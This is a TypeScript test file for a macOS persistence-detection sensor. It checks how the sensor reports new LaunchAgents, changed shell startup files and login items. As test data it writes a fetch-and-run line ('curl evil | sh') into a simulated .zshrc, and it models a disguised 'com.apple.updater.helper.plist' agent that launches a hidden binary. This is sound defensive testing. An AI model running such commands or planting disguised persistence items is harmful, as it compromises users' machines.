import { DEFAULT_VANGUARD_SETTINGS, type NewSecurityFinding } from '@midnite/studio-shared';
import { describe, expect, it } from 'vitest';

import { CODESIGN_UNSIGNED, HOME, PLIST_AMOS } from './__fixtures__/sensor-fixtures';
import { createPersistenceSensor, type PersistenceFs } from './persistence-sensor';
import type { SensorContext, SensorRunProcess } from './sensor-host';

function memFs(files: Record<string, string>) {
  const json = new Map<string, Record<string, string>>();
  const watchers: Array<{ path: string; cb: (f: string | null) => void }> = [];
  const fs: PersistenceFs = {
    readdir: async (dir) =>
      Object.keys(files)
        .filter((p) => p.startsWith(`${dir}/`) && !p.slice(dir.length + 1).includes('/'))
        .map((p) => p.slice(dir.length + 1)),
    readFile: async (p) => (p in files ? new TextEncoder().encode(files[p]) : null),
    readJson: async (p) => json.get(p) ?? null,
    writeJson: async (p, v) => void json.set(p, v),
    watch: (path, cb) => {
      const w = { path, cb };
      watchers.push(w);
      return () => void watchers.splice(watchers.indexOf(w), 1);
    },
  };
  return { fs, files, watchers };
}

function ctxFor(
  run: SensorRunProcess,
  recorded: NewSecurityFinding[],
  settings = DEFAULT_VANGUARD_SETTINGS,
): SensorContext {
  return {
    userData: '/u',
    homeDir: HOME,
    now: () => 1,
    runProcess: run,
    record: async (f) => {
      recorded.push({ ...f, source: 'vanguard' });
      return {
        ...f,
        source: 'vanguard',
        id: 'i',
        firstSeen: 1,
        lastSeen: 1,
        count: 1,
        status: 'open',
      } as never;
    },
    settings: () => settings,
    signal: new AbortController().signal,
    log: () => undefined,
  };
}

const run: SensorRunProcess = async (cmd, args) => {
  if (cmd === 'plutil') return { ok: true, stdout: PLIST_AMOS, stderr: '', exitCode: 0 };
  if (cmd === 'codesign') return { ok: true, stdout: '', stderr: CODESIGN_UNSIGNED, exitCode: 1 };
  if (cmd === 'xattr') return { ok: true, stdout: '0083;1;x;', stderr: '', exitCode: 0 };
  if (cmd === 'crontab') return { ok: true, stdout: '', stderr: '', exitCode: 1 };
  void args;
  return { ok: false, reason: 'failed', hint: 'n/a' };
};

describe('persistence sensor', () => {
  it('seeds a baseline silently, then reports a new LaunchAgent as critical with its ProgramArguments', async () => {
    const m = memFs({ [`${HOME}/.zshrc`]: 'export A=1' });
    const sensor = createPersistenceSensor({ fs: m.fs, uid: 501 });
    const recorded: NewSecurityFinding[] = [];
    const ctx = ctxFor(run, recorded);
    await sensor.run!(ctx);
    expect(recorded).toHaveLength(0);

    m.files[`${HOME}/Library/LaunchAgents/com.apple.updater.helper.plist`] = 'bplist';
    const r = await sensor.run!(ctx);
    expect(r).toEqual({ findings: 1 });
    const f = recorded[0]!;
    expect(f.category).toBe('persistence');
    expect(f.severity).toBe('critical');
    expect(f.evidence).toContainEqual({
      kind: 'command',
      command: `${HOME}/Library/Application Support/.x/x`,
      args: [],
    });
    expect(f.remediation).toContainEqual({
      id: 'bootout-launch-item',
      domain: 'gui/501',
      path: `${HOME}/Library/LaunchAgents/com.apple.updater.helper.plist`,
    });
    // The state is now the baseline: an unchanged re-scan is quiet.
    await sensor.run!(ctx);
    expect(recorded).toHaveLength(1);
  });

  it('reports a changed shell rc file as high, and ignores a removal', async () => {
    const m = memFs({ [`${HOME}/.zshrc`]: 'a', [`${HOME}/.bashrc`]: 'b' });
    const sensor = createPersistenceSensor({ fs: m.fs });
    const recorded: NewSecurityFinding[] = [];
    const ctx = ctxFor(run, recorded);
    await sensor.run!(ctx);
    m.files[`${HOME}/.zshrc`] = 'a; curl evil | sh';
    delete m.files[`${HOME}/.bashrc`];
    await sensor.run!(ctx);
    expect(recorded.map((f) => [f.severity, f.title])).toEqual([
      ['high', 'Changed Shell startup file: .zshrc'],
    ]);
  });

  it('a watcher event on a watched file name triggers a debounced scan; an unrelated file does not', async () => {
    const m = memFs({ [`${HOME}/.zshrc`]: 'a' });
    let fired: (() => void) | null = null;
    const sensor = createPersistenceSensor({
      fs: m.fs,
      setTimer: (fn) => ((fired = fn), 1),
      clearTimer: () => undefined,
    });
    const recorded: NewSecurityFinding[] = [];
    const ctx = ctxFor(run, recorded);
    await sensor.run!(ctx);
    const dispose = (await sensor.start!(ctx)) as () => void;
    const homeWatch = m.watchers.find((w) => w.path === HOME)!;
    homeWatch.cb('Documents');
    expect(fired).toBeNull();
    m.files[`${HOME}/.zshrc`] = 'b';
    homeWatch.cb('.zshrc');
    expect(fired).not.toBeNull();
    fired!();
    await new Promise((r) => setTimeout(r, 0));
    await new Promise((r) => setTimeout(r, 0));
    expect(recorded).toHaveLength(1);
    dispose();
    expect(m.watchers).toHaveLength(0);
  });

  it('never runs sfltool unless login-item scanning is opted in — it raises a password prompt', async () => {
    const calls: string[] = [];
    const spy: SensorRunProcess = async (cmd, args, opts) => (
      calls.push(cmd),
      run(cmd, args, opts)
    );
    const sensor = createPersistenceSensor({ fs: memFs({}).fs });
    await sensor.run!(ctxFor(spy, []));
    expect(calls).not.toContain('sfltool');

    // Turning it on records the login items as the baseline rather than reporting them all as new.
    const recorded: NewSecurityFinding[] = [];
    let dump = 'Name: Alpha\n';
    const withBtm: SensorRunProcess = async (cmd, args, opts) =>
      cmd === 'sfltool'
        ? (calls.push(cmd), { ok: true, stdout: dump, stderr: '', exitCode: 0 })
        : spy(cmd, args, opts);
    const optedIn = ctxFor(withBtm, recorded, {
      ...DEFAULT_VANGUARD_SETTINGS,
      scanLoginItems: true,
    });
    await sensor.run!(optedIn);
    expect(calls).toContain('sfltool');
    expect(recorded).toHaveLength(0);

    dump = 'Name: Alpha\nName: Beta\n';
    await sensor.run!(optedIn);
    expect(recorded.map((f) => f.title)).toEqual(['Changed Login item: sfltool dumpbtm']);
  });
});
